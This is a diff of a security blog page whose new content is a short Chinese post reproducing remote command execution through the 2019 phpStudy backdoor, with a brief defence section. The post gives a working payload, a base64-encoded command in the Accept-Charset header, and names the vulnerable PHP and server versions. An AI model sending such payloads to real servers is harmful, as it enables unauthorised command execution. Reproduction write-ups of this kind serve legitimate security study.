@@ -7,9 +7,13 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>
-    道萝岗特森&#39;s Blog
+    phpstudy rce 复现 | 道萝岗特森&#39;s Blog
   </title>
   <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  漏洞复现
+  ">
   
   <meta name="author" content="daolgts">
 
@@ -86,128 +90,89 @@
 </nav>
 
 <div class="main-container">
-  
-
-<div class="container-lg">
-  
-
-<div class="blog-intro">
-  <div class="blog-intro-user">
-    <img class="avatar" src="/images/avatar.png">
-    <div class="user-name">
-      <div class="blog-title">道萝岗特森&#39;s Blog</div>
-      <div class="blog-author">daolgts</div>
-        <ul class="user-detail mobile-only">
-    
-    <li>
-      <i class="fa fa-map-marker"></i>
-      Earth,Solar system,Milky Way
-    </li>
-    
-    <li>
-      <i class="fa fa-envelope-o"></i>
-      <a href="mailto:904756917@qq.com">904756917@qq.com</a>
-    </li>
-    
-    <li>
-      <i class="fa fa-link"></i>
-      <a href="https://daolgts.github.io">https://daolgts.github.io</a>
-    </li>
-  </ul>
-    </div>
-    <div class="blog-description">
-      hello world
-    </div>
-  </div>
-
-  <ul class="user-detail desktop-only">
-    
-    <li>
-      <i class="fa fa-map-marker"></i>
-      Earth,Solar system,Milky Way
-    </li>
-    
-    <li>
-      <i class="fa fa-envelope-o"></i>
-      <a href="mailto:904756917@qq.com">904756917@qq.com</a>
-    </li>
-    
-    <li>
-      <i class="fa fa-link"></i>
-      <a href="https://daolgts.github.io">https://daolgts.github.io</a>
-    </li>
-  </ul>
-
-  <div class="social-media desktop-only">
-    <h4>Social Media</h4>
-    <ul>
-      
-      <li class="social-media-item"><a href="https://github.com/daolgts" target="_blank"><i class="fa fa-github"></i></a></li>
-      
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 37 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 18 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
     </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
   </div>
-</div>
 
-
-  <div class="blog-detail">
-    
-<nav class="blog-detail-nav desktop-only">
-  <ul class="clearfix">
-    <li class="">
-      <a href="/">Overview</a></li>
-    <li class="">
-      <a href="/archives">Posts <span class="counter">37</span></a>
-    </li>
-    <!-- <li class="">
-      <a href="/categories">Categories <span
-          class="counter">0</span></a></li> -->
-    <li class="selected">
-      <a href="/tags">Tags <span class="counter">18</span></a></li>
-
-    <li class="">
-      <a href="/links">Links</a></li>
-    <li class="">
-      <a href="/about">About</a></li>
-  </ul>
-</nav>
-
-    <div class="body-secondary">
-      <ul class="archive-list">
-        
-        <li class="archive-list-item">
-          <h2><a href="/2018/08/11/不用字母数字下划线的webshell/">不用字母数字下划线的webshell</a></h2>
-          <p>
-               铺垫知识    异或 ^   在 PHP 中两个变量进行异或时，会先将字符串转换成 ASCII 值，再将 ASCII 值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。 
-      1   2   3   4   5   6   7   8       ph...
-          </p>
-          <ul class="tag-list clearfix">
-            
-            <li class="tag-list-item"><a href="/tags/技术总结/">技术总结</a></li>
-            
-            <li class="tag-list-item"><a href="/tags/php/">php</a></li>
-            
-            <li class="tag-list-item"><a href="/tags/webshell/">webshell</a></li>
-            
-          </ul>
-          <div class="post-info">
-            <!-- <span>
-              
-              <i class="fa fa-folder-open"></i> Uncategorized
-              
-            </span> -->
-            <span>
-              <i class="fa fa-tag">技术总结</i>
-            </span>
-            <span>
-              Published {{moment(1533987636000).fromNow()}}
-            </span>
-          </div>
-        </li>
-        
-      </ul>
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
     </div>
   </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1569329282000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1569329282000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>phpstudy rce 复现</h1>
+    <p>phpstudy 在2016年被入侵植入后门，前几天被爆出来</p>
+<p>相关文章：</p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/187208" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187208</a></li>
+<li><a href="https://www.anquanke.com/post/id/187152" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187152</a></li>
+<li><a href="https://www.anquanke.com/post/id/187202" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187202</a></li>
+</ul>
+<h2 id="rce-复现"><a href="#rce-复现" class="headerlink" title="rce 复现"></a>rce 复现</h2><p>首先安装带后门的 phpstudy，启动</p>
+<p>访问任意一个 php 文件，带上 payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Charset: ZWNobyBgaXBjb25maWdgOw==</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br></pre></td></tr></table></figure>
+
+<p><code>Accept-Charset</code> 的值是 base64 编码的命令</p>
+<p>我自己测试，只有 <code>php 5.2 + apahce</code>,<code>php 5.4 +apache</code>,<code>php 5.2 +nginx</code> 这三种环境能够利用</p>
+<p><img src="https://s2.ax1x.com/2019/09/24/uEpE2d.png" alt="uEpE2d.png"></p>
+<p><img src="https://s2.ax1x.com/2019/09/24/uEpA8H.png" alt="uEpA8H.png"></p>
+<p><img src="https://s2.ax1x.com/2019/09/24/uEpVxA.png" alt="uEpVxA.png"></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>可以下载官网的检测工具检测有无后门，从官网下载最新版本</p>
+<p><img src="https://s2.ax1x.com/2019/09/24/uEpYMn.png" alt="uEpYMn.png"></p>
+
+  </article>
 </div>
+
+
+    
+
+
+
+
 </div>
 
 <div class="footer-wrapper container">
